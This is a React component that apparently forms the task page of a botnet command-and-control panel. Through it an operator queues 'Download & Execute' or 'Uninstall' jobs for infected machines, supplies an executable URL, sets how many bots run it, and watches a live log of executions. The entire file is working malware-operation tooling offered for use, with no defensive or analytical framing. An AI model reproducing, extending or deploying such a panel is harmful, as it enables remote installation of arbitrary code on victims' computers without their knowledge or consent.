import React, { useState, useEffect } from 'react';
import {
  Row,
  Card,
  CardBody,
  Input,
  CardTitle,
  FormGroup,
  Label,
  CustomInput,
  Button,
  FormText,
  Form,
  Table,
} from 'reactstrap';
import IntlMessages from '../../../helpers/IntlMessages';
import { Colxx, Separator } from '../../../components/common/CustomBootstrap';
import Breadcrumb from '../../../containers/navs/Breadcrumb';
import { NotificationManager } from '../../../components/common/react-notifications';
import axios from 'axios';

const onFormSubmit = (e) => {
  const data = new FormData(e.target);
  if (Number(data.get('numberOfExecutions')) === 0) {
    axios
      .get('/api/status/bot?type=status', {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          axios
            .post('/api/task/create?type=task', JSON.stringify({
              taskType: data.get('taskType'),
              parameter: data.get('param'),
              targetExecution: Number(res.data.value.split('/')[0]),
            }), {
              headers: {
                "Token": localStorage.getItem('token'),
              },
            })
            .then((res2) => {
              if (res2.data.code === 200) {
                createNotification('success', null, "Succeed!", res2.data.message);
              }
            })
            .catch((error) => {
              createNotification('error', null, "Failed!", error.response.data.message);
            })
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  } else {
    axios
      .post('/api/task/create?type=task', JSON.stringify({
        taskType: data.get('taskType'),
        parameter: data.get('param'),
        targetExecution: Number(data.get('numberOfExecutions')),
      }), {
        headers: {
          "Token": localStorage.getItem('token'),
        },
      })
      .then((res) => {
        if (res.data.code === 200) {
          createNotification('success', null, "Succeed!", res.data.message);
        }
      })
      .catch((error) => {
        createNotification('error', null, "Failed!", error.response.data.message);
      })
  }
  e.preventDefault();
}

const createNotification = (type, className, title, content) => {
  const cName = className || '';
  switch (type) {
    case 'primary':
      NotificationManager.primary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'secondary':
      NotificationManager.secondary(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'info':
      NotificationManager.info('Info message', '', 3000, null, null, cName);
      break;
    case 'success':
      NotificationManager.success(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'warning':
      NotificationManager.warning(
        content,
        title,
        3000,
        null,
        null,
        cName
      );
      break;
    case 'error':
      NotificationManager.error(
        content,
        title,
        5000,
        () => {
          alert('callback');
        },
        null,
        cName
      );
      break;
    default:
      NotificationManager.info('Info message');
      break;
  }
};

const TaskDefault = ({ match }) => {
  const [taskLogs, setTaskLogs] = useState([]);
  useEffect(() => {
    const update = () => {
      axios
        .get('/api/task/history?type=task', {
          headers: {
            "Token": localStorage.getItem('token'),
          },
        })
        .then((res) => {
          if (res.data.code === 200) {
            setTaskLogs(res.data.tasks);
          }
          setTimeout(update, 5000);
        })
        .catch(() => {
          setTimeout(update, 5000);
        })
      }
    update();
  }, []);

  return (
    <>
      <Row>
        <Colxx xxs="12">
          <Breadcrumb heading="menu.bot.task" match={match} />
          <Separator className="mb-5" />
        </Colxx>
      </Row>
      <Row className="mb-4">
        <Colxx xxs="6">
          <Card>
            <CardBody>
              <CardTitle>
                <IntlMessages id="forms.bot-task" />
              </CardTitle>
              <Form onSubmit={onFormSubmit}>
                <FormGroup>
                  <Label for="taskType">
                    <IntlMessages id="forms.task-type" />
                  </Label>
                  <div>
                    <CustomInput
                      defaultChecked
                      inline
                      type="radio"
                      id="taskType"
                      name="taskType"
                      label="Download & Execute"
                      value="execute"
                    />
                    <CustomInput
                      inline
                      type="radio"
                      id="taskType2"
                      name="taskType"
                      label="Uninstall"
                      value="uninstall"
                    />
                  </div>
                </FormGroup>

                <FormGroup>
                  <Label for="param">
                    <IntlMessages id="forms.param" />
                  </Label>
                  <Input
                    type="text"
                    name="param"
                    id="param"
                    placeholder="https://example.com/client.exe"
                  />
                </FormGroup>

                <FormGroup>
                  <Label for="numberOfExecutions">
                    <IntlMessages id="forms.number-of-executions" />
                  </Label>
                  <Input
                    required
                    type="number"
                    name="numberOfExecutions"
                    id="numberOfExecutions"
                    placeholder="50"
                  />
                  <FormText color="muted">
                    <IntlMessages id="forms.number-of-executions-muted" />
                  </FormText>
                </FormGroup>

                <Button color="primary" className="mt-4">
                  <IntlMessages id="forms.submit" />
                </Button>
              </Form>
            </CardBody>
          </Card>
        </Colxx>

        <Colxx xxs="6">
          <Card className="mb-4">
            <CardBody>
              <CardTitle>
                <IntlMessages id="table.task-log" />
              </CardTitle>
              <Table>
                <thead>
                  <tr>
                    <th>#</th>
                    <th>Task Type</th>
                    <th>Parameter</th>
                    <th>Executed</th>
                  </tr>
                </thead>
                <tbody>
                  {(taskLogs || [])
                    .map((x) => {
                      return (
                        <tr>
                          <th scope="row">{x.id}</th>
                          <td>{x.taskType}</td>
                          <td>{x.parameter}</td>
                          <td>{x.currentExecution}</td>
                        </tr>
                      );
                    })}
                </tbody>
              </Table>
            </CardBody>
          </Card>
        </Colxx>
      </Row>
    </>
  );
};

export default TaskDefault;
